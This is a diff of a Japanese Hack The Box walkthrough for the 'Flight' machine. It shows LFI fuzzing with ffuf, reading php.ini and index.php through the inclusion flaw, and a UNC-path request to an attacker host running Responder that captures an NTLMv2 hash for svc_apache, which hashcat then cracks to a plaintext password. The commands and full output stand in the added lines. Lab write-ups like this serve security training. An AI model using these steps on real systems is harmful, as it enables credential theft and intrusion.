@@ -100,7 +100,7 @@ http://school.flight.htb/index.php?view=blog.html
 「About Us」「Blog」にアクセス、ページの１部分がファイルインクルード処理で変更されていことが分かる  
 phpでファイルインクルード処理を実施しているが、lfiまたはrfiの脆弱性があるかも
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_03.png">  
-レスポンスサイズ「1102」（ファイル無）フィルタしてfuzzing  
+レスポンスサイズ「1102」（ファイルが存在しない場合）はフィルタしてfuzzing  
 lfiの脆弱性を確認！
 ```sh
 └─$ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u 'http://school.flight.htb/index.php?view=FUZZ' -fs 1102     
@@ -145,7 +145,15 @@ c:/xampp/apache/logs/error.log [Status: 200, Size: 283597, Words: 30173, Lines: 
 c:/xampp/apache/logs/access.log [Status: 200, Size: 279512, Words: 25586, Lines: 1747, Duration: 295ms]
 :: Progress: [236/236] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
 ```
-lfiは確認したが、rfiは動作するか確認するためにindex.phpのソースコードをlfiで確認
+php.iniを確認、[リンク](https://web.archive.org/web/20240418085821/https://qiita.com/satorunooshie/items/39eda7b6a41909e89d29#allow_url_include)を参照  
+allow_url_fopenが有効のためリモートファイルの読み込みは可能だが、allow_url_includeが無効のため実行はできないもよう
+```sh
+└─$ curl -s 'http://school.flight.htb/index.php?view=c:/xampp/php/php.ini' | grep 'allow_url_include\|allow_url_fopen'
+allow_url_fopen = On
+allow_url_include = Off
+```
+脆弱なindex.phpのソースコードをlfiで確認  
+viewのパラメータに「..」や「//」などが含まれるとGET拒否される仕組み
 ```php
 └─$ curl 'http://school.flight.htb/index.php?view=index.php'                           
 <!DOCTYPE html>
@@ -187,3 +195,100 @@ if ((strpos(urldecode($_GET['view']),'..')!==false)||
 
 ~~~
 ```
+GET拒否されるviewパラメータを回避して、kaliのresponderに対するrfi実施  
+rfiによってkaliのresponderにsmbアクセス・強制認証によりクレデンシャルを取得する
+```sh
+└─$ curl 'http://school.flight.htb/index.php?view=//10.10.16.4/share/a.txt'
+```
+flight\svc_apacheのntlmv2ハッシュ値を取得成功！
+```sh
+─$ sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.4]
+    Responder IPv6             [dead:beef:4::1002]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-SXXGVN35NIR]
+    Responder Domain Name      [K6XI.LOCAL]
+    Responder DCE-RPC Port     [47985]
+
+[*] Version: Responder 3.1.7.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+[*] To sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[SMB] NTLMv2-SSP Client   : 10.129.238.60
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E002D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
+```
+取得したntlmv2ハッシュをクラック成功！
+パスワード、S@Ss!K@*t13を取得
+```sh
+└─$ name-that-hash -f svc_apache.txt --no-banner
+svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E0
+02D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300
+030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
+
+Most Likely 
+NetNTLMv2, HC: 5600 JtR: netntlmv2
+```
+```sh
+└─$ hashcat -a 0 -m 5600 svc_apache.txt /usr/share/wordlists/rockyou.txt --quiet
+SVC_APACHE::flight:7480e093cd0cc6d2:875288c3e4026dc8af430f72bfabe029:010100000000000080d13ecedb3cdc01bafa2b06278ec63e00000000020008004b0036005800490001001e00570049004e002d00530058005800470056004e00330035004e004900520004003400570049004e002d00530058005800470056004e00330035004e00490052002e004b003600580049002e004c004f00430041004c00030014004b003600580049002e004c004f00430041004c00050014004b003600580049002e004c004f00430041004c000700080080d13ecedb3cdc0106000400020000000800300030000000000000000000000000300000e49fe70a59898e7f8bd0dfaacac25a27200865b470e26f8e5d5ffa5fa56151400a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:S@Ss!K@*t13
+```
+
+
+## STEP 4
